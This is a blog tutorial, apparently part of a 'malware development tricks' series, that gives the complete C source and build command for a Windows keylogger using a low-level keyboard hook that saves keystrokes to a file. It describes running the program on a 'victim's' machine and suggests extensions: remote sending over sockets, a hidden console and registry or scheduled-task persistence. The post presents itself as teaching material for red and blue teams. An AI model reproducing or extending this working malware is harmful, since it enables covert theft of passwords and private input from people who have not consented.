---
title:  "Malware development trick 46: simple Windows keylogger. Simple C example."
date:   2025-05-01 03:00:00 +0300
header:
  teaser: "/assets/images/153/2025-05-02_09-20.png"
categories:
  - malware
tags:
  - red team
  - windows
  - malware
  - keyboard
  - win32api
---

ï·½

Hello, cybersecurity enthusiasts and white hackers!        

![malware](/assets/images/153/2025-05-02_09-20.png){:class="img-responsive"}    

This post is very simple but not less important. One of my students ask about another simple trick in malware development: keylogging logic.      

To my surprise, I haven't written an article on this topic here. Sometimes you just want something simple: press a key, log it to a file, move on. Let's break it down.     

### practical example

I will show a simple proof-of-concept (PoC) in pure C. This tiny C keylogger uses the `WH_KEYBOARD_LL` hook to monitor keystrokes and write them to a local text file. To intercept keystrokes globally, we use:     

```cpp
hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
```

This sets a low-level keyboard hook. Our callback (`KeyboardProc`) is invoked every time a key is pressed.    

If `VK_ESCAPE` is pressed, we unhook and exit:    

```cpp
if (p->vkCode == VK_ESCAPE) {
  runThread = false;
  UnhookWindowsHookEx(hook);
  PostQuitMessage(0);
}
```

We need logic to save keystrokes to a file:    

```cpp
// open file in append mode and save key
FILE* fp = fopen("keylog.txt", "a+");
if (fp) {
  DWORD key = p->vkCode;
  fprintf(fp, "key pressed: %c\n", MapVirtualKeyA(key, MAPVK_VK_TO_CHAR));
  fclose(fp);
}
```

No socket exfiltration, just writing to disk. Old-school.

The standard message processing cycle usually looks like this:

```cpp
while (runThread && GetMessage(&msg, NULL, 0, 0)) {
  TranslateMessage(&msg);
  DispatchMessage(&msg);
}
```

Keyboard events are taken from the queue using the `GetMessage` function and redirected to the `DispatchMessage` procedure, which handles messages for the window that is currently focused, using the `DispatchMessage` function.  The input focus is a property that can be given to a window made by Windows or a program. As long as the window is focused on input, all keyboard messages from the system queue will get to the right function in this window. An app can move the focus from one input window to another, like when you use `Alt+Tab` to switch to a different app:     

```cpp
BOOL GetMessage(
  [out]          LPMSG lpMsg,
  [in, optional] HWND  hWnd,
  [in]           UINT  wMsgFilterMin,
  [in]           UINT  wMsgFilterMax
);

LRESULT DispatchMessage(
  [in] const MSG *lpMsg
);
```

Usually, the `TranslateMessage` function is called before the `DispatchMessage` function. This function takes the `WM_KEYDOWN`, `WM_KEYUP`, `WM_SYSKEYDOWN`, and `WM_SYSKEYUP` messages as a starting point to make the "symbolic" messages `WM_CHAR`, `WM_SYSCHAR`, `WM_DEADCHAR`, and `WM_SYSDEADCHAR`. It is important to note that the original keyboard messages are not removed from this queue; instead, these "symbolic" messages are added to it:     

```cpp
BOOL TranslateMessage(
  [in] const MSG *lpMsg
);
```

Final full source code of our keylogger looks like this (`hack.c`):     

```cpp
/*
 * hack.c
 * save keystrokes to file
 * author @cocomelonc
 * https://cocomelonc.github.io/malware/2025/05/01/malware-tricks-45.html
 */
#include <windows.h>
#include <stdio.h>
#include <stdbool.h>

HHOOK hook;
LPMSG msg;
bool runThread = true;

LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam) {
  if (code == HC_ACTION && wParam == WM_KEYDOWN) {
    KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;

    if (p->vkCode == VK_ESCAPE) {
      runThread = false;
      UnhookWindowsHookEx(hook);
      printf("hooking disabled by esc key. meow =^..^=\n");
      PostQuitMessage(0);
      return 0;
    }

    // open file in append mode
    FILE* fp = fopen("keylog.txt", "a+");
    if (fp) {
      DWORD key = p->vkCode;
      fprintf(fp, "key pressed: %c\n", MapVirtualKeyA(key, MAPVK_VK_TO_CHAR));
      fclose(fp);
    }
  }
  return CallNextHookEx(hook, code, wParam, lParam);
}

// classic keylogger logic
int main(int argc, char* argv[]) {
  MSG msg;

  // install the hook - using the WH_KEYBOARD_LL action
  HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
  if (hook == NULL) {
    printf("failed to install hook :(\n");
    return 1;
  }

  printf("hook installed. meow =^..^= press esc to stop :)\n");

  // message loop
  while (runThread && GetMessage(&msg, NULL, 0, 0)) {
    TranslateMessage(&msg);
    DispatchMessage(&msg);
  }

  return 0;
}
```

### demo

Let's go to see everything in action. Compile `hack.c`:    

```bash
x86_64-w64-mingw32-g++ hack.c -o hack.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

![malware](/assets/images/153/2025-05-02_09-14.png){:class="img-responsive"}    


Run `hack.exe` on the victim's Windows machine (`Windows 10 x64 22H2` in my case), type something, then press `ESC`. Check `keylog.txt` in the same directory:    

![malware](/assets/images/153/2025-05-02_09-18.png){:class="img-responsive"}    

![malware](/assets/images/153/2025-05-02_10-04.png){:class="img-responsive"}    

As you can see, everything is worked perfectly! =^..^=    

This is just the base. From here you could:

Obfuscate filenames    
Use sockets to send keystrokes remotely    
Hide the console window    
Make it [persistent](https://cocomelonc.github.io/tutorial/2022/04/26/malware-pers-2.html) (e.g. [registry](https://cocomelonc.github.io/tutorial/2022/04/20/malware-pers-1.html) or [task scheduler](https://cocomelonc.github.io/persistence/2025/03/12/malware-pers-27.html))    

Stay tuned for more malware tricks! =^..^=

Several APT groups and cybercriminal organizations like [APT37](https://malpedia.caad.fkie.fraunhofer.de/actor/apt37), [Sandworm](https://malpedia.caad.fkie.fraunhofer.de/actor/sandworm) and malware like [MyDoom](https://malpedia.caad.fkie.fraunhofer.de/details/win.mydoom), [ROKRAT](https://attack.mitre.org/software/S0240/) or [NOKKI](https://attack.mitre.org/software/S0353/) have employed this trick.    

I hope this post is useful for malware researchers, C/C++ programmers, spreads awareness to the blue teamers of this interesting classic keylogging technique, and adds a weapon to the red teamers arsenal.      

[GetMessage](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getmessage)    
[DispatchMessage](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-dispatchmessage)    
[TranslateMessage](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-translatemessage)     
[APT37](https://malpedia.caad.fkie.fraunhofer.de/actor/apt37)    
[Sandworm](https://malpedia.caad.fkie.fraunhofer.de/actor/sandworm)     
[MyDoom](https://malpedia.caad.fkie.fraunhofer.de/details/win.mydoom)     
[ROKRAT](https://attack.mitre.org/software/S0240/)     
[NOKKI](https://attack.mitre.org/software/S0353/)     
[source code in github](https://github.com/cocomelonc/meow/tree/master/2025-05-01-malware-trick-46)    

> This is a practical case for educational purposes only.

Thanks for your time happy hacking and good bye!         
*PS. All drawings and screenshots are mine*       
